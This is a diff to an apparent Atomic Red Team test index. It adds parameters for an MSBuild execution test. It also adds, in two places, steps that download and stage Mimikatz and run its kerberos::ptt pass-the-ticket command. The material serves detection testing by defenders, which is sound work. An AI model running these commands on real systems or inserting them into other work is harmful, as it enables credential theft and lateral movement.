@@ -33153,6 +33153,14 @@ defense-evasion:
           description: Location of the project file
           type: Path
           default: PathToAtomicsFolder\T1127.001\src\T1127.001.csproj
+        msbuildpath:
+          description: Default location of MSBuild
+          type: Path
+          default: C:\Windows\Microsoft.NET\Framework\v4.0.30319
+        msbuildname:
+          description: Default name of MSBuild
+          type: Path
+          default: msbuild.exe
       dependency_executor_name: powershell
       dependencies:
       - description: 'Project file must exist on disk at specified location (#{filename})
@@ -33165,9 +33173,7 @@ defense-evasion:
           New-Item -Type Directory (split-path #{filename}) -ErrorAction ignore | Out-Null
           Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1127.001/src/T1127.001.csproj" -OutFile "#{filename}"
       executor:
-        command: 'C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe #{filename}
-
-'
+        command: "#{msbuildpath}\\#{msbuildname} #{filename}\n"
         name: command_prompt
   T1134.003:
     technique:
@@ -35546,10 +35552,26 @@ defense-evasion:
           description: domain
           type: string
           default: atomic.local
-      executor:
-        command: 'mimikatz # kerberos::ptt #{user_name}@#{domain}
+        mimikatz_exe:
+          description: Path of the Mimikatz binary
+          type: string
+          default: PathToAtomicsFolder\T1550.003\bin\mimikatz.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz must exist on disk at specified location (#{mimikatz_exe})
 
 '
+        prereq_command: 'if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
+          New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
+          Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
+      executor:
+        command: "#{mimikatz_exe} # kerberos::ptt #{user_name}@#{domain}\n"
         name: command_prompt
   T1556.002:
     technique:
@@ -55464,10 +55486,26 @@ lateral-movement:
           description: domain
           type: string
           default: atomic.local
-      executor:
-        command: 'mimikatz # kerberos::ptt #{user_name}@#{domain}
+        mimikatz_exe:
+          description: Path of the Mimikatz binary
+          type: string
+          default: PathToAtomicsFolder\T1550.003\bin\mimikatz.exe
+      dependency_executor_name: powershell
+      dependencies:
+      - description: 'Mimikatz must exist on disk at specified location (#{mimikatz_exe})
 
 '
+        prereq_command: 'if (Test-Path #{mimikatz_exe}) {exit 0} else {exit 1}
+
+'
+        get_prereq_command: |
+          [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+          Invoke-WebRequest "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip" -OutFile "$env:TEMP\Mimi.zip"
+          Expand-Archive $env:TEMP\Mimi.zip $env:TEMP\Mimi -Force
+          New-Item -ItemType Directory (Split-Path #{mimikatz_exe}) -Force | Out-Null
+          Copy-Item $env:TEMP\Mimi\x64\mimikatz.exe #{mimikatz_exe} -Force
+      executor:
+        command: "#{mimikatz_exe} # kerberos::ptt #{user_name}@#{domain}\n"
         name: command_prompt
   T1563.002:
     technique:
